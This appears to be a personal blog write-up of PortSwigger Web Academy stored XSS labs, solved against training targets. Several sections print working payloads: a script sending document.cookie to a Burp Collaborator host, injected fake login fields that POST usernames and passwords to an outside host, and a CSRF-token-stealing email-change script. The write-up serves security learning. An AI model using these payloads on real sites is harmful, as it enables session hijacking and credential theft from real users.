---
title: (Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2023-01-25 09:00:00 +0200
categories: [Web Application, Cross Site Scripting]
tags: [Notes, Cross Site Scripting, Stored XSS, Portswigger]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post/writeup is all about the stored XSS Vulnerabilities.

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting) Labs, but i do intent do throw other labs and writeups here as well.

To learn more on the topic, please visit the article linked above at Portswigger's.

## TOC
- [Intro](#intro)
  - [TOC](#toc)
- [Lab: Stored XSS into HTML context with nothing encoded](#lab-stored-xss-into-html-context-with-nothing-encoded)
- [Exploiting cross-site scripting to steal cookies](#exploiting-cross-site-scripting-to-steal-cookies)
- [Exploiting cross-site scripting to capture passwords](#exploiting-cross-site-scripting-to-capture-passwords)
- [Exploiting cross-site scripting to perform CSRF](#exploiting-cross-site-scripting-to-perform-csrf)
- [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](#stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped)
- [Stored XSS into anchor href attribute with double quotes HTML-encoded](#stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded)


# Lab: Stored XSS into HTML context with nothing encoded

> This lab contains a stored cross-site scripting vulnerability in the comment functionality.
> 
> To solve this lab, submit a comment that calls the alert function when the blog post is viewed.

This is the webpage that we get on after we spin the lab.

![picture 1](/assets/images/c89ad083d0dfbc6bf908dee03f3b85576fec9ebd6173fb6b404523c35c5d80e7.png)  

We can send a post.

![picture 2](/assets/images/b031e33dd7fe51dd43480a4dd071803536d0795eb5608944dd97f82f19c204aa.png)  

Alert triggers on `Comment` entry:

![picture 3](/assets/images/03597b44f2184b36720316eb36fc70a886f1dacd05813a8c4e9d50a793a13804.png)  

Source Code
```html
<section class="comment">
  <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">                            
    <a id="author" href="http://&lt;script&gt;alert(3)&lt;/script&gt;.com">test&lt;script&gt;alert(2)&lt;/script&gt;</a> | 27 January 2023
  </p>
  <p><script>alert(1)</script></p>
  <p></p>
</section>
```

# Exploiting cross-site scripting to steal cookies
**Collaborator has to be used in order to solve the lab**
> This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

Webpage looks like in the previous lab.

We can trigger XSS in the `Comment` section.

![picture 4](/assets/images/207ea1c0215ff613634222a0788608ef5d3b3036d263a45d838dff43c35dd32d.png)  

Cookie will be printed in the alert popup.

![picture 5](/assets/images/dfa0f7dced73cca96f7ccd9020d0535652a8daa0ca86b3394b8a8940aebbe788.png)  

As we now need to exfiltrate the token, we'll need to use payload that will send that token to Burps Collaborator.

```
<script>location='http://iyk9morvj5u0hqdrwttw8300frli98xx.oastify.com/c='+document.cookie;</script>
```

We should soon see an entry in our Collaborator.

![picture 7](/assets/images/ccf5b54528ffc0de04cfd6fe3b61394e68582f7596e839821a832c568a002ad3.png)  

We can now simply change `session` token with the one found in Collaborator.

![picture 6](/assets/images/d87e266a5bc8a745214dadedbafddec619288d01d508bc10afe3f07f026ca1ad.png)  

# Exploiting cross-site scripting to capture passwords
**Collaborator has to be used in order to solve the lab**

> This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

Lab looks exactly the same as the previous ones. We can send posts where XSS vulnerability resides.

First we have to find a XSS:

![picture 1](/assets/images/380f214820fd243663c105a8103b8d96c407ff27dce6f11e8b3923d8e6ebb82f.png)  

This fires an alert.

To read the stored passwords, following payload will be used.

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length) fetch('https://b5hjav637onob24mud688qqf46axyqmf.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

![picture 8](/assets/images/1abcc075df1dc799630ce9a219c1cb6b366fccf029333c02d5f0adec91a0f95a.png)  

Let's add a comment. We should get a callback from a victim:

![picture 2](/assets/images/7a657e5733a65cfd26fd1b85d09f385255cee4785e20fb8beff919bb3149bd45.png)  

Log in and finish the lab.

# Exploiting cross-site scripting to perform CSRF
> This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

Same as in the previous lab, there is a Stored XSS in the comment field.

![picture 3](/assets/images/98d18a2e7d0867853efde02b03327465adbd5bf74a1f722c847aba59aad2cd82.png)  

This is the payload which will fetch the CSRF token and change the email from victim.

```html
<script>
function xss(url, text, formData) {
  fetch(url+"/change-email", {
  method: "POST",
  body: formData
  })
}

function fetchUrl(url, email){
	fetch(url).then(r => r.text().then(text => {
		  xss(url, text, 'email='+email+'&csrf='+text.match(/csrf" value="([^"]+)"/)[1]);
	}))
}

fetchUrl("https://0a87006804525819c1b3cb09006500cf.web-security-academy.net/my-account", "test@test.de");
</script>
```

![picture 4](/assets/images/51b82672a4c0bd2ff9625a5246b66ecbdf939f637643e15daac368227d2c56cb.png)  

# Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

> This lab contains a stored cross-site scripting vulnerability in the comment functionality.
> 
> To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

If we add a comment and if we check the source code afterwards, we'll notice that our email addrss get's embedded into HTML like this

```html
<p>
  <img src="/resources/images/avatarDefault.svg" class="avatar">
    <a id="author" href="http://test.de" onclick="var tracker={track(){}};tracker.track('http://test.de');">test</a> 
  | 24 March 2023
</p>
```

If we add single or double quotes, they will get escaped 

```html
<a id="author" href="http://\'&quot;alert(3).com" onclick="var tracker={track(){}};tracker.track('http://\'&quot;alert(3).com');">a</a>
```

Payload used in Webpage field: `http://a?&apos;-alert(1)-&apos;`

And this is how it got escaped:

```html
<a id="author" href="http://a?'-alert(1)-'" onclick="var tracker={track(){}};tracker.track('http://a?'-alert(1)-'');">s</a>
```

Alert has fired and lab has been solved.

![picture 5](/assets/images/57e85b8312bdcbd2c97324e3cb3c2df3e43d693ca98677ed0e2cd28948ef2e1b.png)  

# Stored XSS into anchor href attribute with double quotes HTML-encoded

> This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

Injection in the `href` attribute ==> `javascript:alert(1)`.